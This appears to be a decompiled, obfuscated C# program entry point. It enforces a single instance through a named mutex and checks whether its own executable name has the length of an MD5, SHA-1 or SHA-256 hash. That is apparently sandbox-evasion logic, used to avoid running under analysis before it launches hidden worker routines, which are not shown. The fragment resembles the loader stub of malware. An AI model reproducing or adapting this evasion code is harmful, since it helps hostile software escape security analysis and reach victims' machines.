using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using ns0;

namespace Main;

internal static class Program
{
	[STAThread]
	private unsafe static void Main()
	{
		void* ptr = stackalloc byte[10];
		new Mutex(initiallyOwned: true, $"MSVI32", out *(bool*)((byte*)ptr + 8));
		if (((byte*)ptr)[8] == 0)
		{
			Environment.Exit(0);
		}
		((byte*)ptr)[9] = 0;
		int[] array = new int[3] { 32, 48, 64 };
		*(int*)ptr = 0;
		while (*(int*)ptr < array.Length)
		{
			*(int*)((byte*)ptr + 4) = array[*(int*)ptr];
			if (new FileInfo(Application.get_ExecutablePath()).Name.Length == *(int*)((byte*)ptr + 4) - ".exe".Length)
			{
				((byte*)ptr)[9] = 1;
			}
			(*(int*)ptr)++;
		}
		if (Class27.smethod_116() && ((byte*)ptr)[9] == 0)
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				Class27.smethod_75(0);
			});
			thread.Start();
			Thread thread2 = new Thread((ThreadStart)delegate
			{
				Class27.smethod_87();
			});
			thread2.Start();
			thread2.Join();
			Class27.smethod_8();
			thread.Join();
		}
		else
		{
			Thread thread3 = new Thread((ThreadStart)delegate
			{
				Class27.smethod_75(-1);
			});
			thread3.Start();
			thread3.Join();
		}
		Class27.smethod_14(0);
	}
}
